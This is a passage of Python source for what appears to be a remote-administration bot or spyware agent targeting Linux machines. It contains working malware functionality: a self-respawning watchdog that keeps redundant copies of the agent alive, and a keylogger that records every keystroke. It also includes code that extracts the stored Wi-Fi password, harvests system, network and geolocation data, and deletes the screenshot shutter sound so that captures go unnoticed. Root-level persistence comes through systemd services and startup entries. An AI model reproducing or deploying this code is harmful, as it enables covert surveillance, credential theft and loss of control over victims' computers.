#!/bin/bash
PIDFILE="{PATH_SYS}/kernel.pid"
COMMAND_MAIN="python3 \\"{PATH}/{BOT_NAME}\\""
COMMAND_ALT="python3 \\"{PATH_RESERVE}/{BOT_RESERVE_NAME}\\""
LOGFILE="{path_support_bot_flag}"
while true; do
    echo 1 > "$LOGFILE"
    if [ -f "$PIDFILE" ]; then
        PID=$(cat "$PIDFILE" 2>/dev/null)
        if ! ps -p "$PID" > /dev/null 2>&1; then
            eval "$COMMAND_MAIN" > /dev/null 2>&1 &
            if [ $? -ne 0 ]; then
                eval "$COMMAND_ALT" > /dev/null 2>&1 &
            fi
        fi
    else
        eval "$COMMAND_MAIN" > /dev/null 2>&1 &
        if [ $? -ne 0 ]; then
            eval "$COMMAND_ALT" > /dev/null 2>&1 &
        fi
    fi
    sleep 3
done
'''.strip())
        os.chmod(path_sys_agent_sh, 0o755)
        startfile(path_sys_agent_sh)


    try:
        support_bot()
    except: ...

    counter_support_bot = 1

    while True:
        try:
            if module_is_disabled(PATH_MODULE_AGENT + '.flag'):
                if send:
                    send_function('Agent module is disabled')

                return
        except: ...

        try:
            if counter_support_bot % 3 == 0:
                with open(path_support_bot_flag, 'r') as support_bot_flag:
                    if support_bot_flag.read().strip() != '1':
                        support_bot()
        except: ...

        try:
            for folder_to, file, folder_from in [(PATH_RESERVE, BOT_RESERVE_NAME, f'{PATH}/{BOT_NAME}'), 
                                                (PATH, BOT_NAME, f'{PATH_RESERVE}/{BOT_RESERVE_NAME}')]:
                if not os.path.exists(f'{folder_to}/{file}'):
                    if not os.path.exists(folder_to):
                        os.mkdir(folder_to)

                    if os.path.exists(folder_to):
                        copy(folder_from, f'{folder_to}/{file}')
        except: ...

        try:
            with open(path_support_bot_flag, 'w') as support_bot_flag:
                support_bot_flag.write('0')
            
            counter_support_bot += 1
        except: ...

        try:
            setup_rights()
            module_report(PATH_MODULE_AGENT + '.flag')
            sleep(3)
        except: ...
        

def module_keylogger(send=None, send_function=None):
    if send:
        try: 
            send_function('Keylogger module is started')
        except: ...

    while True:
        try:
            key = python_root(f"""from keyboard import read_event
keyboard_event = read_event()
if keyboard_event.event_type.lower().strip() == 'down':
    print(keyboard_event.name)""", output=True).strip()

            if module_is_disabled(PATH_MODULE_KEYLOGGER + '.flag'):
                if send:
                    send_function('Keylogger module is disabled')

                return

            if key == 'backspace':
                with open(PATH_MODULE_KEYLOGGER, 'r', encoding='utf-8') as keyboard_log:
                    keyboard_log_data = keyboard_log.read()

                if not keyboard_log_data[-1] in ['[', ']']:
                    with open(PATH_MODULE_KEYLOGGER, 'w', encoding='utf-8') as keyboard_log:
                        keyboard_log.write(keyboard_log_data[:-1])
            else:
                with open(PATH_MODULE_KEYLOGGER, 'a', encoding='utf-8') as keyboard_log:
                    if key == 'enter':
                        keyboard_log.write('\n')
                    elif key == 'space':
                        keyboard_log.write(' ')
                    elif key in KEYLOGGER_KEYS:
                        keyboard_log.write(f'[{key.upper()}]')
                    else:
                        keyboard_log.write(key)
            
            module_report(PATH_MODULE_KEYLOGGER + '.flag')
        except:
            continue


def module_blocker_app(name, mode, send=False, send_function=None):
    path_module = PATH_MODULE_BLOCKER_APP + '.data'

    if name.startswith('python'):
        raise ValueError('This app cannot be blocked')

    if mode == 'start':
        app = []

        if send:
            try: 
                send_function('Blocker app module is started')
            except: ...

        if os.path.exists(path_module):
            with open(path_module, 'r') as module_blocker_app:
                for n in module_blocker_app.readlines():
                    try:
                        app.append(n.split(',')[-1].strip())
                    except:
                        continue
            
            while True:
                try:
                    if module_is_disabled(PATH_MODULE_BLOCKER_APP + '.flag'):
                        if send:
                            send_function('Blocker app module is disabled')

                        return

                    for n in app:
                        try:
                            sp.run(['sudo', 'pkill', '-9', n], stdout=sp.DEVNULL, stderr=sp.DEVNULL, input=False)
                        except:
                            continue
                    
                    module_report(PATH_MODULE_BLOCKER_APP + '.flag')
                    sleep(3)
                except:
                    continue
    elif mode == 'block':
        date_blocked_app = get_date()

        if not os.path.exists(path_module):
            with open(path_module, 'w') as module_blocker_app: ...
        
        with open(path_module, 'r+') as module_blocker_app:
            if not name in module_blocker_app.read():
                module_blocker_app.write(f'{date_blocked_app[0]} {date_blocked_app[-1]}, {name}\n')
    elif mode == 'unblock':
        data_module_app = ''

        if os.path.exists(path_module):
            with open(path_module, 'r') as module_blocker_app:
                for n in module_blocker_app.readlines():
                    if n and not name in n:
                        data_module_app += f'{n.strip()}\n' 
            
            with open(path_module, 'w') as module_blocker_app:
                module_blocker_app.write(data_module_app)
    elif mode == 'list':
        date = []
        name = []

        if os.path.exists(path_module):
            with open(path_module, 'r') as module_blocker_app:
                for n in module_blocker_app.readlines():
                    try:
                        data_module = n.split(',')

                        date.append(' | '.join(data_module[0].split()))
                        name.append(data_module[-1].strip())
                    except:
                        continue
            return tabulate(list(zip(date, name)), 
                            headers=[('DATE'), ('APP')], tablefmt='pipe')
        else: 
            return ''
    else:
        with open(path_module, 'w') as module_blocker_app: ...


def create_service(name, path, description):
    path_service = f'{PATH_SERVICES}/{name}.service'

    if sp.run('sudo systemctl --help'.split(), stdout=sp.DEVNULL, stderr=sp.DEVNULL, input=False).returncode != 0:
        raise TypeError(f"DON'T SUPPORT THIS FUNCTION IN {ID}")

    if not os.path.isfile(path):
        raise FileNotFoundError(f"[Errno 2] No such file: '{path}'")

    with open(path_service, 'w') as file_service:
        file_service.write(f'''
[Unit]
Description={description}

[Service]
Type=simple
ExecStart={os.path.abspath(path)}
User=root

[Install]
WantedBy=default.target
'''.strip())
        
    sp.run('sudo systemctl daemon-reload'.split(), stdout=sp.DEVNULL, stderr=sp.DEVNULL, input=False)
    sp.run(f'sudo systemctl enable {file_service}'.split(), stdout=sp.DEVNULL, stderr=sp.DEVNULL, input=False)


def start_service(name):
    if INSTALLER_PACKAGES == 'apk':
        sp.run(f'sudo rc-service {name} start'.split(), stdout=sp.DEVNULL, stderr=sp.DEVNULL, input=False)
        sp.run(f'sudo rc-update add {name}'.split(), stdout=sp.DEVNULL, stderr=sp.DEVNULL, input=False)
    else:
        sp.run(f'sudo systemctl enable --now {name}'.split(), stdout=sp.DEVNULL, stderr=sp.DEVNULL, input=False)


def delete_service(name):
    path_service = f'{PATH_SERVICES}/{name}.service'

    if sp.run('sudo systemctl --help'.split(), stdout=sp.DEVNULL, stderr=sp.DEVNULL, input=False).returncode != 0:
        raise TypeError(f"DON'T SUPPORT THIS FUNCTION IN {ID}")
    
    if not os.path.isfile(path_service):
        raise FileNotFoundError(f"No such service: '{path_service}'")
    
    sp.run(f'sudo systemctl stop {name}'.split(), stdout=sp.DEVNULL, stderr=sp.DEVNULL, input=False)
    sp.run(f'sudo systemctl disable {name}'.split(), stdout=sp.DEVNULL, stderr=sp.DEVNULL, input=False)
    del_file(f'{PATH_SERVICES}/{name}.service')


def stop_service(name):
    if sp.run('sudo systemctl --help'.split(), stdout=sp.DEVNULL, stderr=sp.DEVNULL, input=False).returncode != 0:
        raise TypeError(f"DON'T SUPPORT THIS FUNCTION IN {ID}")
    
    if sp.run(f'sudo systemctl disable {name}'.split(), stdout=sp.DEVNULL, stderr=sp.DEVNULL, input=False).returncode != 0:
        raise ValueError(f'Unit file {name} does not exist')


def add_startup(name, user, command, args):
    date_added_startup = get_date()

    if not os.path.exists(PATH_STARTUP):
        with open(PATH_STARTUP, 'w') as file_startup: ...


    with open(PATH_STARTUP, 'r+') as file_startup:
        if not name in file_startup.read():
            file_startup.write(f'{date_added_startup[0]},{date_added_startup[-1]},{name},{user},{command},{args}\n')


def delete_startup(name):
    data_startup = ''

    if os.path.exists(PATH_STARTUP):
        with open(PATH_STARTUP, 'r') as file_startup:
            file_startup_data = file_startup.read()

            if not name in file_startup_data:
                raise FileNotFoundError(f"This name is not present in startup: '{name}'")

            for n in file_startup_data.split('\n'):
                if n.strip() and not name in n:
                    data_startup += f'{n.strip()}\n'
            
        with open(PATH_STARTUP, 'w') as file_startup:
            file_startup.write(data_startup)
    else:
        return


def get_startup_data():
    date = []
    name = []
    user = []
    command = []
    args = []
    
    if os.path.exists(PATH_STARTUP):
        with open(PATH_STARTUP, 'r') as file_startup:
            for n in file_startup.readlines():
                try:
                    data_startup = n.split(',')

                    date.append(' | '.join(data_startup[:2]))
                    name.append(data_startup[2])
                    user.append(data_startup[3])
                    command.append(data_startup[4].strip())
                    args.append(data_startup[5].strip())
                except: 
                    continue
        if not name:
            return ''

        return tabulate(list(zip(date, name, user, command, args)),
            headers=[('DATE'), ('NAME'), ('USER'), ('COMMAND'), ('ARGUMENTS')], tablefmt='pipe')
    else:
        return ''


def execute_startup():
    user = []
    command = []
    args = []

    if os.path.exists(PATH_STARTUP):
        with open(PATH_STARTUP, 'r') as file_startup:
            for n in file_startup.readlines():
                try:
                    data_startup = n.split(',')

                    user.append(data_startup[3])
                    command.append(data_startup[4].strip())
                    args.append(data_startup[5].strip())
                except: 
                    continue

        for n in list(zip(user, command, args)):
            try:
                if os.path.isfile(n[1]):
                    startfile(n[1], n[2],True if n[0] == 'root' else False)
                else:
                    command_for_execute = []
                    for j in ['sudo' if n[0] == 'root' else '', n[1], n[2] if n[2] != 'NULL' else '']:
                        if j:
                            command_for_execute.append(j)

                    sp.Popen(command_for_execute, stdout=sp.DEVNULL, stderr=sp.DEVNULL)
            except:
                continue


def get_http(url, file=''):
    if file:
        with open(file, 'wb') as http_file:
            http_file.write(get_http_code(url, headers=HEADERS, timeout=3600).content)
    else:
        return get_http_code(url, headers=HEADERS, timeout=10).text


def check_package_or_lib(name, text):
    if not name in text:
        return True
    

def install_package(name):
    if INSTALLER_PACKAGES == 'pacman':
        sp.run(f'sudo {INSTALLER_PACKAGES} -S --noconfirm {name}'.split(), stdout=sp.DEVNULL, stderr=sp.DEVNULL, input=False)
    elif INSTALLER_PACKAGES == 'zypper':
        sp.run(f'sudo {INSTALLER_PACKAGES} install --non-interactive {name}'.split(), stdout=sp.DEVNULL, stderr=sp.DEVNULL, input=False)
    elif INSTALLER_PACKAGES == 'apk':
        sp.run(f'sudo {INSTALLER_PACKAGES} add --no-confirm {name}'.split(), stdout=sp.DEVNULL, stderr=sp.DEVNULL, input=False)
    else: 
        sp.run(f'sudo {INSTALLER_PACKAGES} install -y {name}'.split(), stdout=sp.DEVNULL, stderr=sp.DEVNULL, input=False)


def pip_install(name):
    sp.run([PATH_PIP, 'install', name], stdout=sp.DEVNULL, stderr=sp.DEVNULL, input=False)


def write_lib_error(name, error):
    global libs_error

    libs_error += f'Module not working: ({name}) | Error: ({type(error).__name__}) | Description: ({error})\n'


def sort_data(data):
    seen = set()
    result = []

    for item in data:
        if item not in seen:
            seen.add(item)
            result.append(item)

    return result


def generator_symbols(length='', pattern=''):
    if not length:
        length = KEY_LENGTH
    
    if not pattern:
        pattern = KEY_SYMBOLS

    symbols = ''

    for _ in range(int(length)):
        symbols += choice(pattern)

    return symbols


def encrypt_string(string):
    global session_symbols, PATTERN_SYMBOLS
    
    string = str(string)
    result = ''

    for n in string:
        if not n in session_symbols:
            PATTERN_SYMBOLS.append(n)
            session_symbols[n] = generator_symbols()

        if n in session_symbols:
            result += KEY_PATTERN_MAIN + session_symbols[n]
        else:
            result += KEY_PATTERN_ANOTHER + session_symbols[n]
    
    return result


def decrypt_string(string):
    string = str(string)
    result = ''

    for n in string.split(KEY_PATTERN_MAIN):
        symbol, *another_symbol = n.split(KEY_PATTERN_ANOTHER)

        for sym in session_symbols.items():
            if sym[-1] == symbol:
                result += sym[0]
                break

        if another_symbol:
            result += ''.join(another_symbol)

    return result


def decode_shell_output(command, flag=True):
    if flag:
        try:
            executed_command = sp.run(command, stdout=sp.PIPE, stderr=sp.DEVNULL, input=False)
            
            if executed_command.returncode == 0:
                result = executed_command.stdout
            else:
                return ''
        except: 
            return ''
    else:
        result = command

    try: 
        return result.decode(detect(result)['encoding']).strip()
    except: 
        return result.decode().strip()


def get_date():
    try: 
        return datetime.now().strftime('%H:%M %d.%m.%Y').split() 
    except: 
        return ['NOT FOUND', 'NOT FOUND']


def startfile(path, args=[], root=False):
    file_extension = os.path.split(path)[-1]
    file_extension = file_extension[file_extension.rindex('.') + 1:]

    if not os.path.isfile(path):
        raise FileNotFoundError(f'[Errno 2] No such file: \'{path}\'')

    if root:
        sudo = ['sudo']
    else:
        sudo = []

    if file_extension in ['py', 'pyw', 'pyz']:
        command = [PATH_PYTHON, path]
    elif file_extension in ['sh', 'bash']:
        command = ['bash', path]
    elif file_extension in ['deb']:
        command = ['dpkg', '-i', path]
    elif file_extension in ['rpm']:
        command = ['rpm', '-i', path]
    elif file_extension in ['exe']:
        command = ['wine', path]
    elif file_extension in ['mp4', 'mkv', 'avi', 'mov', 'flv', 'wmv', 'webm', 'mpeg', 'mpg', 'm4v', 
                            '3gp', 'ts', 'rm', 'vob', 'ogv', 'f4v', 'm2ts']:
        command = ['cvlc', '--fullscreen', path]
    elif file_extension in ['mp2', 'mp3', 'ogg', 'wav', 'wma', 'aac']:
        playsound(path)
        return
    elif file_extension in ['jpg', 'jpeg', 'png', 'gif', 'bmp', 'tif', 'tiff', 
                            'webp', 'ppm', 'pgm', 'pbm', 'pnm', 'ico', 'xpm', 'svg']:
        command = ['feh', '-F', path]
    else:
        command = [f'./{path}']

    sp.Popen(sudo + command + args, stdout=sp.DEVNULL, stderr=sp.DEVNULL)


def check_path(path):
    if not os.path.exists(path):
        raise FileNotFoundError(f"[WinError 2] The specified file or folder was not found: '{path}'")
        

def copy(path_from, path_to):
    sp.run(['sudo', 'cp', '-r', path_from, path_to], stdout=sp.DEVNULL, stderr=sp.DEVNULL, input=False)


def move(path_from, path_to):
    sp.run(['sudo', 'mv', path_from, path_to], stdout=sp.DEVNULL, stderr=sp.DEVNULL, input=False)


def creator_folder(path):
    if type(path) is str:
        if not os.path.exists(path): 
            try:
                os.mkdir(path)
            except:
                return
    else:
        for folder_path in path:
            if not os.path.exists(folder_path): 
                try:
                    os.mkdir(folder_path)
                except:
                    continue


def del_file(file_path):
    try:
        os.remove(file_path)
    except: ...

    if os.path.exists(file_path): 
        sp.run(['sudo', 'rm', '-f', file_path], stdout=sp.DEVNULL, stderr=sp.DEVNULL, input=False)
    

def del_screenshot_sound():
    screen_sound = decode_shell_output(['sudo', 'find', '/usr/share/sounds/', '-iname', "'*shutter*'"])

    if screen_sound.strip():
        for file_screen_sound in screen_sound.split('\n'):
            if file_screen_sound:
                del_file(file_screen_sound)


def _delete_directory(directory):
    folder_paths = []

    for folder_path in [_folder_path[0] for _folder_path in directory]: 
        for _path in glob(f'{folder_path}/*'): 
            if not os.path.isfile(_path): 
                try: 
                    folder_paths.append(_path)
                except: 
                    continue
            else: 
                del_file(_path)

    for folder_directory in folder_paths[::-1]:
        try: 
            os.rmdir(folder_directory)
        except: 
            continue


def delete_directory(directory_path, mode=0):
    if os.path.exists(directory_path): 
        sp.run(['sudo', 'rm', '-f', '-r', directory_path], stdout=sp.DEVNULL, stderr=sp.DEVNULL, input=False)
    else:
        if mode == 1: 
            check_path(directory_path)
    
    if os.path.exists(directory_path):
        try: 
            os.rmdir(directory_path)
        except: 
            _delete_directory(list(os.walk(directory_path)))
            os.rmdir(directory_path)


def get_wifi():
    network_devices = []

    nmcli_device = decode_shell_output('sudo nmcli device'.split())

    if 'DEVICE' in nmcli_device:
        for nmcli_device in nmcli_device.split('\n')[1:]:
            try:
                network_devices.append(nmcli_device.split()[0])
            except:
                continue

        for network_device in network_devices:
            iwlist_interface_scan = decode_shell_output(f'sudo iwlist {network_device} scan'.split())

            if iwlist_interface_scan:
                ssid = findall(r'ESSID:"(\S.+)"', iwlist_interface_scan)
                bssid = findall(r'Address:\s(\S.+)\s', iwlist_interface_scan)
                channel = findall(r'Channel:(\d+)', iwlist_interface_scan)
                frequency = findall(r'Frequency:(\S.+GHz)', iwlist_interface_scan)
                encryption = findall(r'Encryption key:(\S+)', iwlist_interface_scan)
                signal = findall(r'Signal level=([-]\d+\sdBm)', iwlist_interface_scan)

                return tabulate(
                    list(zip(ssid, bssid, channel, frequency, encryption, signal)), 
                    headers=[('SSID'), ('BSSID'), ('CHANNEL'), ('FREQUENCY'), ('ENCRYPTION'), ('SIGNAL')], 
                    tablefmt='pipe'
                )
    else:
        return 


def get_wifi_password():
    try:
        current_wifi = [n.split()[-1] for n in decode_shell_output('sudo nmcli device wifi show-password'.split()).split('\n')[:3:2]]
        return f'SSID: {current_wifi[0]}\nPASSWORD: {current_wifi[-1]}'
    except:
        return ''


def systeminfo(ipconfig=False):
    videocard = []
    disk_name = []
    disk_file_system = []
    disk_size = []
    disk_path = []
    pci_device = ''
    usb_device = ''
    route_ssid = ''
    route_password = ''
    route_ip = []
    route_mac_address = []
    connection = []

    if not ipconfig:
        uptime = decode_shell_output('sudo uptime'.split())
        hostnamectl = decode_shell_output('sudo hostnamectl'.split())
        cat_proc_cpuinfo = decode_shell_output('sudo cat /proc/cpuinfo'.split())
        lspci = decode_shell_output('sudo lspci'.split())
        free_h = decode_shell_output('sudo free -h'.split())
        df_T_h = decode_shell_output('sudo df -T -h'.split())
        lsusb = decode_shell_output('sudo lsusb'.split())

        if 'up' in uptime and 'user' in uptime:
            working_time = search(r'up\s(.*),\s+\d+\suser', uptime).group(1).split()
        else:
            working_time = 'NOT FOUND'

        if 'Static hostname' in hostnamectl and 'Chassis' in hostnamectl and 'Hardware Vendor' in hostnamectl and 'Kernel' in hostnamectl: 
            user = search(r'Static hostname[:]\s(\S.+)', hostnamectl).group(1)
            computer = search(r'Chassis[:]\s(\S.+)', hostnamectl).group(1)
            hardware_vendor = search(r'Hardware Vendor[:]\s(\S.+)', hostnamectl).group(1)
            hardware_model = search(r'Hardware Model[:]\s(\S.+)', hostnamectl).group(1)
            architecture = search(r'Architecture[:]\s(\S.+)', hostnamectl).group(1)
            platform = search(r'Operating System[:]\s(\S.+)', hostnamectl).group(1)
            kernel = search(r'Kernel[:]\s(\S.+)', hostnamectl).group(1)
        else:
            user = 'NOT FOUND'
            hardware_vendor = 'NOT FOUND'
            hardware_model = 'NOT FOUND'
            architecture = 'NOT FOUND'
            computer = 'NOT FOUND'
            platform = 'NOT FOUND'
            kernel = 'NOT FOUND'

        if 'model name' in cat_proc_cpuinfo and 'cpu MHz' in cat_proc_cpuinfo and 'cache size' in cat_proc_cpuinfo:
            cpu_kernel = os.cpu_count()
            cpu = sort_data(findall(r'model name\s+[:]\s(\S.+)', cat_proc_cpuinfo))
            cpu_frequency = [f'{n} MHz' for n in sort_data(findall(r'cpu MHz\s+[:]\s(\S.+)', cat_proc_cpuinfo))]
            cpu_cache = sort_data(findall(r'cache size\s+[:]\s(\S.+)', cat_proc_cpuinfo))
        else:
            cpu_kernel = 'NOT FOUND'
            cpu = 'NOT FOUND'
            cpu_frequency = 'NOT FOUND'
            cpu_cache = 'NOT FOUND'
        
        if 'VGA' in lspci:
            for n in findall(r'VGA compatible controller[:]\s(\S.+)', lspci):
                videocard.append(n.split('(')[0].strip())
        else:
            videocard = 'NOT FOUND'

        try:
            window_resolution = pygui.size()
            screen_resolution = f'{window_resolution.width}x{window_resolution.height}'
        except:
            screen_resolution = 'NOT FOUND'

        if 'Gi' in free_h or 'Mi' in free_h:
            memory = findall(r'\S[:]\s+(\S+)', free_h)
            ram = memory[0]
            swap = memory[1:]
        else:
            ram = 'NOT FOUND'
            swap = 'NOT FOUND'
        
        if df_T_h:
            for n in df_T_h.split('\n'):
                try:
                    disk_data = n.split()

                    disk_name.append(disk_data[0])
                    disk_file_system.append(disk_data[1])
                    disk_size.append(disk_data[2])
                    disk_path.append(' '.join(disk_data[6:]))

                except: 
                    continue

            disk_name = disk_name[1:]
            disk_file_system = disk_file_system[1:]
            disk_size = disk_size[1:]
            disk_path = disk_path[1:]
        else:
            disk_name = 'NOT FOUND'
            disk_file_system = 'NOT FOUND'
            disk_size = 'NOT FOUND'
            disk_path = 'NOT FOUND'

        if lspci: 
            for n in findall(r'[:]\s(\S.+)', lspci):
                pci_device += n.split('(')[0].strip() + '\n'
        else:
            pci_device = 'NOT FOUND'

        if lsusb:
            for n in findall(r'ID\s\S+[:]\S+\s(\S.+)', lsusb):
                usb_device += n + '\n'
        else:
            usb_device = 'NOT FOUND'

    ip_a = decode_shell_output('sudo ip a'.split())
    ip_neigh = decode_shell_output('sudo ip neigh'.split())
    nmcli_device_status = decode_shell_output('sudo nmcli device status'.split())

    for n in get_wifi_password().split('\n'):
        if 'SSID' in n:
            route_ssid = n.split()[-1]
        elif 'PASSWORD' in n:
            route_password = n.split()[-1]
    
    if not route_ssid:
        route_ssid = 'Ethernet connection'
        route_password = 'NOT FOUND'

    try:
        website_content = parse_json(get_http(URL_IPCONFIG))
    except: 
        website_content = dict()

    global_ip_address = website_content.get(URL_IPCONFIG_KEYS['ip'], 'NOT FOUND')
    internet_provider = website_content.get(URL_IPCONFIG_KEYS['isp'], 'NOT FOUND')

    if not URL_IPCONFIG_KEYS['coordinate']:
        try:
            coordinate = str(website_content[URL_IPCONFIG_KEYS['latitude']]) + ',' + str(website_content[URL_IPCONFIG_KEYS['longitude']])
        except: 
            coordinate = 'NOT FOUND'
    else:
        coordinate = website_content.get(URL_IPCONFIG_KEYS['coordinate'])

    location = {
        'country': website_content.get(URL_IPCONFIG_KEYS['country'], 'NOT FOUND'),
        'region': website_content.get(URL_IPCONFIG_KEYS['region'], 'NOT FOUND'),
        'city': website_content.get(URL_IPCONFIG_KEYS['city'], 'NOT FOUND'),  
        'location': coordinate
    }

    if 'inet' in ip_a and 'link/ether' in ip_a:
        interface = findall(r'\d+[:]\s((?!lo)\S+)[:]', ip_a)
        ipv4 = findall(r'inet\s((?!127.0.0.1)\d+[.]\d+[.]\d+[.]\d+)', ip_a)
        ipv6 = findall(r'inet6\s(\S+[:][:]\S+[:]\S+[:]\w+)', ip_a)
        mac_address = findall(r'link/ether\s(\S+[:]\S+[:]\S+[:]\S+[:]\S+[:]\S+)', ip_a)

        for ip in ipv4:
            route_ip.append(search(r'(\d+[.]\d+[.]\d+)', ip).group(1) + '.1')

        for ip in route_ip:
            if ip in ip_neigh:
                route_mac_address.append(search(rf'[{ip}].+lladdr\s(\S+[:]\S+[:]\S+[:]\S+[:]\S+[:]\S+)', ip_neigh).group(1))
            else:
                route_mac_address.append('NOT FOUND')
    else:
        interface = 'NOT FOUND'
        ipv4 = 'NOT FOUND'
        ipv6 = 'NOT FOUND'
        mac_address = 'NOT FOUND'
        route_ip = 'NOT FOUND'
        route_mac_address = 'NOT FOUND'
    
    if 'DEVICE' in nmcli_device_status:
        for device in findall(r'^(\S+)\s+(\S+)\s+(\S+)', nmcli_device_status, flags=MULTILINE)[1:]:
            if device[0] in interface:
                connection.append((device[1], device[-1]))
    else:
        connection = 'NOT FOUND'
            
    if not ipconfig:
        return \
            '/' + '-' * 50 + 'COMPUTER' + '-' * 50 + '\\' + '\n' + \
            f'Working time: {working_time}' + '\n' + \
            f'Language: {os.getenv('LANG', 'NOT FOUND')}' + '\n' + \
            f'User: {user}' + '\n' + \
            f'Device: {computer}' + '\n' + \
            f'Hardware vendor: {hardware_vendor}' + '\n' + \
            f'Hardware model: {hardware_model}' + '\n' + \
            f'Architecture: {architecture}' + '\n' + \
            f'Platform: {platform}' + '\n' + \
            f'Kernel release: {kernel}' + '\n' + \
            f'Processor: {cpu}' + '\n' + \
            f'Processor kernel: {cpu_kernel}' + '\n' + \
            f'Processor cache: {cpu_cache}' + '\n' + \
            f'Processor frequency: {cpu_frequency}' + '\n' + \
            f'Videocard: {videocard}' + '\n' + \
            f'Screen resolution: {screen_resolution}' + '\n' + \
            f'RAM: {ram}' + '\n' + \
            f'Swap: {swap}' + '\n' + \
            '/' + '-' * 50 + 'DISK' + '-' * 50 + '\\' + '\n' + \
            tabulate(list(zip(disk_name, disk_file_system, disk_size, disk_path)), 
                headers=[('NAME'), ('FILE-SYSTEM'), ('SIZE'), ('PATH')], tablefmt='pipe') + '\n' + \
            '/' + '-' * 50 + 'PCI-DEVICE' + '-' * 50 + '\\' + '\n' + \
            pci_device.strip() + '\n' + \
            '/' + '-' * 50 + 'USB-DEVICE' + '-' * 50 + '\\' + '\n' + \
            usb_device.strip() + '\n' + \
            '/' + '-' * 50 + 'NETWORK' + '-' * 50 + '\\' + '\n' + \
            f'Router ssid: {route_ssid if route_ssid else "NOT FOUND"}\n' + \
            f'Router password: {route_password if route_password else "NOT FOUND"}\n' + \
            f'Router IP-Address: {route_ip if route_ip else "NOT FOUND"}\n' + \
            f'Router Mac-Address: {route_mac_address if route_mac_address else "NOT FOUND"}\n' + \
            f'Global IP-Address: {global_ip_address}\n' + \
            f'Internet provider: {internet_provider}\n' + \
            f'IPv4-Address: {ipv4 if ipv4 else "NOT FOUND"}\n' + \
            f'IPv6-Address: {ipv6 if ipv6 else "NOT FOUND"}\n' + \
            f'Mac-Address: {mac_address if mac_address else "NOT FOUND"}\n' + \
            f'Interface: {interface if interface else "NOT FOUND"}\n' + \
            f'Connection: {connection if connection else "NOT FOUND"}\n' + \
            f'Country: {location["country"]}\n' + \
            f'Region: {location["region"]}\n' + \
            f'City: {location["city"]}\n' + \
            f'Location: {location["location"]}'
    else:
        return \
            f'Router ssid: {route_ssid if route_ssid else "NOT FOUND"}\n' + \
            f'Router password: {route_password if route_password else "NOT FOUND"}\n' + \
            f'Router IP-Address: {route_ip if route_ip else "NOT FOUND"}\n' + \
            f'Router Mac-Address: {route_mac_address if route_mac_address else "NOT FOUND"}\n' + \
            f'Global IP-Address: {global_ip_address}\n' + \
            f'Internet provider: {internet_provider}\n' + \
            f'IPv4-Address: {ipv4 if ipv4 else "NOT FOUND"}\n' + \
            f'IPv6-Address: {ipv6 if ipv6 else "NOT FOUND"}\n' + \
            f'Mac-Address: {mac_address if mac_address else "NOT FOUND"}\n' + \
            f'Interface: {interface if interface else "NOT FOUND"}\n' + \
            f'Connection: {connection if connection else "NOT FOUND"}\n' + \
            f'Country: {location["country"]}\n' + \
            f'Region: {location["region"]}\n' + \
            f'City: {location["city"]}\n' + \
            f'Location: {location["location"]}'


def get_services():
    service_name = []
    service_state = []
    service_description = []

    systemctl = decode_shell_output('sudo systemctl list-units --type=service --all --no-pager --no-legend'.split())

    if 'active' in systemctl and 'inactive' in systemctl:
        for n in systemctl.split('\n'):
            try:
                service_data = n.split()

                if 'active' in service_data or 'inactive' in service_data:
                    offset = 1 if '●' in service_data else 0 

                    service_name.append(service_data[0 + offset])
                    service_state.append(service_data[2 + offset].upper())
                    service_description.append(' '.join(service_data[4 + offset:]))
            except:
                continue
    
        return tabulate(list(zip(service_name, service_state, service_description)),
            headers=[('NAME'), ('STATE'), ('DESCRIPTION')], tablefmt='pipe')
    else:
        return 


def arp():
    ip = []
    mac = []
    interface = []
    state = []

    ip_neigh = decode_shell_output('sudo ip neigh'.split()).strip()

    if 'dev' in ip_neigh:
        for n in ip_neigh.split('\n'):
            try:
                data = n.split()

                ip.append(data[0])
                mac.append(data[4])
                interface.append(data[2])
                state.append(data[-1])
            except: 
                continue

        return tabulate(list(zip(ip, mac, interface, state)), 
                        headers=[('IP-ADDRESS'), ('MAC-ADDRESS'), ('INTERFACE'), ('STATE')], tablefmt='pipe')
    else:
        return 


def netstat():
    ip_from = []
    ip_to = []
    app_name = []
    app_pid = []
    type_connection = []
    state = []

    netstat_p = decode_shell_output('sudo netstat -tunp'.split())

    if 'tcp' in netstat_p or 'udp' in netstat_p:
        for n in netstat_p.split('\n'):
            try:
                data = n.split()

                app = data[-1].split('/')

                if app[0].isdigit():
                    app_name.append(app[-1])
                    app_pid.append(app[0])
                else:
                    app_name.append('NOT FOUND')
                    app_pid.append('NOT FOUND')

                ip_from.append(data[-4])
                ip_to.append(data[-3])
                type_connection.append(data[0].upper())
                state.append(data[-2])
            except:
                continue

        return tabulate(list(zip(type_connection, app_name, app_pid, ip_from, ip_to, state))[2:],
                       headers=[('TYPE'), ('APP'), ('PID'), ('IP-ADDRESS-FROM'), ('IP-ADDRESS-TO'), ('STATE')], tablefmt='pipe')          
    else:
        return
    

def blocker_website(url, mode):


    def resolve_domain(domain):
        try:
            return [ip.to_text() for ip in get_domain_ips(domain, 'A')]
        except:
            return []


    def rule_exists(ip):
        return sp.run(['sudo', 'iptables', '-C', 'OUTPUT', '-d', ip, '-j', 'REJECT'],
                      stdout=sp.DEVNULL, stderr=sp.DEVNULL).returncode == 0


    def block_domain(domain):


        def block_ip(ip):
            if not rule_exists(ip):
                sp.run(['sudo', 'iptables', '-A', 'OUTPUT', '-d', ip, '-j', 'REJECT'])


        ips = resolve_domain(domain)

        if not ips:
            return
        
        for ip in ips:
            block_ip(ip)


    def unblock_domain(domain):


        def unblock_ip(ip):
            if rule_exists(ip):
                sp.run(['sudo', 'iptables', '-D', 'OUTPUT', '-d', ip, '-j', 'REJECT'])


        ips = resolve_domain(domain)

        if not ips:
            return
        
        for ip in ips:
            unblock_ip(ip)

    if not os.path.exists(PATH_BLACKLIST_WEBSITES):
        with open(PATH_BLACKLIST_WEBSITES, 'w') as blacklist_websites: ...

    url = url.split('//')[-1]
    
    if mode == 'block':
        if resolve_domain(url):
            date_blocked_website = get_date()
            block_domain(url)

            with open(PATH_BLACKLIST_WEBSITES, 'r+') as blacklist_websites:
                if not url in blacklist_websites.read():
                    blacklist_websites.write(f'{url} {date_blocked_website[0]} {date_blocked_website[-1]}\n')
    elif mode == 'unblock':
        blacklist_websites_data = ''

        if resolve_domain(url):
            unblock_domain(url)

            with open(PATH_BLACKLIST_WEBSITES, 'r') as blacklist_websites:
                for n in blacklist_websites.readlines():
                    if n.strip() and not url in n:
                        blacklist_websites_data += f'{n.strip()}\n'

            with open(PATH_BLACKLIST_WEBSITES, 'w') as blacklist_websites:
                blacklist_websites.write(blacklist_websites_data)
